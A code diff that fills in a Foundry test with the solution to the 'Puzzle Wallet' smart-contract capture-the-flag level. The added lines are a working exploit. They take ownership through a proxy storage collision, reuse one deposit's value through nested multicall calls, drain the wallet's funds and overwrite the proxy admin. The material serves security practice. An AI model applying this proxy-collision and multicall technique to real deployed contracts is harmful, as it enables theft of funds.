@@ -58,6 +58,20 @@ contract TestPuzzleWallet is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public checkSolvedByPlayer{
+        PuzzleProxy(payable(address(instance))).proposeNewAdmin(player);
+        instance.addToWhitelist(player);
 
+        bytes[] memory data1 = new bytes[](1);
+        data1[0] = abi.encodeCall(PuzzleWallet.deposit, ());
+
+        bytes[] memory data2 = new bytes[](2);
+        data2[0] = abi.encodeCall(PuzzleWallet.deposit, ());
+        data2[1] = abi.encodeCall(PuzzleWallet.multicall, data1);
+
+        instance.multicall{value: 0.001 ether}(data2);
+
+        instance.execute(player, 0.002 ether, "");
+
+        instance.setMaxBalance(uint256(uint160(address(player))));
     }
 }
